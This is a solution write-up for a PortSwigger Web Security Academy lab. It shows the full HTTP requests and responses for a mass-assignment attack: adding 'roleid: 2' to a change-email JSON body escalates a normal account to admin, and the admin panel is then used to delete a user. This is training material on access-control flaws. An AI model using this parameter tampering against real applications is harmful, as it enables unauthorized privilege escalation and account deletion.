
# [Lab 4: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

---

## Description

This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

After successfully logging in with the credentials `wiener:peter`, the `/my-account` page offers a feature for changing the user's email address. Using this feature generates the following request:

```http
POST /my-account/change-email HTTP/1.1
Host: acf51f511f4ebd6c802878a4007900af.web-security-academy.net
Cookie: session=BjMlCeJcCBzDKOmF31rbFPZq4ucZoUkM
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://acf51f511f4ebd6c802878a4007900af.web-security-academy.net
Dnt: 1
Referer: https://acf51f511f4ebd6c802878a4007900af.web-security-academy.net/my-account?id=wiener
Sec-Gpc: 1
Te: trailers
Connection: close

{
	"email": "wiener@admin.net"
}
```

With the response:

```http
HTTP/1.1 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 120

{
  "username": "wiener",
  "email": "wiener@admin.net",
  "apikey": "xpOtLO8T58rDg4ApWp8jJZBTJcMDxR2P",
  "roleid": 1
}
```

Since the endpoint takes a JSON body whose key is a subset of the keys inside the user object (indicated by the JSON body in the response), perhaps it is possible to update the user's `roleid` by also including it in the request body. Submit the following request:

```http
POST /my-account/change-email HTTP/1.1
Host: acf51f511f4ebd6c802878a4007900af.web-security-academy.net
Cookie: session=BjMlCeJcCBzDKOmF31rbFPZq4ucZoUkM
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 46
Origin: https://acf51f511f4ebd6c802878a4007900af.web-security-academy.net
Dnt: 1
Referer: https://acf51f511f4ebd6c802878a4007900af.web-security-academy.net/my-account?id=wiener
Sec-Gpc: 1
Te: trailers
Connection: close

{
	"email":"wiener@admin.net",
	"roleid":  2
}
```

The response indicates that the `roleid` was successfully changed:

```http
HTTP/1.1 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 120

{
  "username": "wiener",
  "email": "wiener@admin.net",
  "apikey": "xpOtLO8T58rDg4ApWp8jJZBTJcMDxR2P",
  "roleid": 2
}
```

Navigate to `/admin` and delete `carlos` to complete the challenge.
